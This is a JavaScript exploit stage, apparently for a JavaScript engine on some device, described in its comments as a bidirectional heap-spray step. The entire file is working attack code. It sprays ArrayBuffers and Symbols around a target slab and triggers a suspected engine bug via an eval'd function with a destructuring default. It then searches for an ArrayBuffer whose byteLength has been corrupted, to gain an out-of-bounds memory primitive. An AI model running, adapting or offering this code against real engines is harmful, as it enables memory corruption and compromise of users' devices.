"use strict";
/* Route-2 bidirectional (72801 port) stage A.
 * The 64 KiB arena slab run can grow up or down on the device; put spray
 * slabs on BOTH sides of b's slab so the +20-slab OOB target is inside the
 * spray either way.  b is created between the pre- and the post-spray. */
var NP = 1800, NQ = 2400, N2 = 415, FS = 488;
var SY = new Array(65600);
for (var i = 0; i < 65600; i++) SY[i] = Symbol();
var KEEP = SY.slice(65600 - 3000); SY = null;
var RT = [4,0,0,0,5,0,0,0,4,0,0,0,4,0,0,0,4,0,0,0];
var RJ = [4,0,0,0,5,0,0,0,255,255,0,0,4,0,0,0,4,0,0,0];
var PB = new Uint8Array(FS);
var A = new Array(NP + NQ), U = new Array(NP + NQ);
for (var i = 0; i < NP; i++) { A[i] = new ArrayBuffer(FS); U[i] = new Uint8Array(A[i]); }
var B = new Array(N2), V2 = new Array(N2);
for (var i = 0; i < N2; i++) { B[i] = new ArrayBuffer(320); V2[i] = new Uint8Array(B[i]); }
var S = '"use strict"; globalThis.f = function ([] = eval("[]")) { var q1=0,q2=0,q3=0; return 0; };';
(0, eval)(S);
for (var i = NP; i < NP + NQ; i++) { A[i] = new ArrayBuffer(FS); U[i] = new Uint8Array(A[i]); }
var D = new Array(600);
for (var i = 0; i < 600; i++) D[i] = new ArrayBuffer(64);
var T = new Array(600);
for (var i = 0; i < 600; i++) T[i] = new ArrayBuffer(64);
T[598] = null;
function fill(p, q) {
  PB.fill(0);
  for (var o = p; o + 40 <= FS; o += 40) {
    for (var k = 0; k < 20; k++) { PB[o+k] = (q ? RJ[k] : RT[k]); PB[o+20+k] = (q ? RT[k] : RJ[k]); }
  }
  for (var i = 0; i < NP + NQ; i++) U[i].set(PB);
}
var mark = "NOCORR", hit = 0, NT = 0;
for (var ph = 0; ph < 20 && !hit; ph += 4) {
  for (var q = 0; q < 2 && !hit; q++) {
    fill(ph, q);
    try { f(); } catch (e) {}
    NT++;
    for (var i = 0; i < 600; i++) {
      if (T[i] !== null && T[i].byteLength > 1024) {
        hit = 1; mark = "ABLEN[" + i + "]=" + T[i].byteLength + " ph=" + ph + " q=" + q + " n=" + NT;
        break;
      }
    }
  }
}
var V = null, VAB = null;
for (var i = 0; i < 600; i++) { if (T[i] !== null && T[i].byteLength > 1024) { VAB = T[i]; break; } }
if (VAB) { try { V = new Uint8Array(VAB); mark += " VLEN=" + V.length; } catch (e2) { mark += " VERR=" + e2; } }
globalThis.V = V; globalThis.VAB = VAB; globalThis.T = T;
throw new Error("RESULT " + mark);
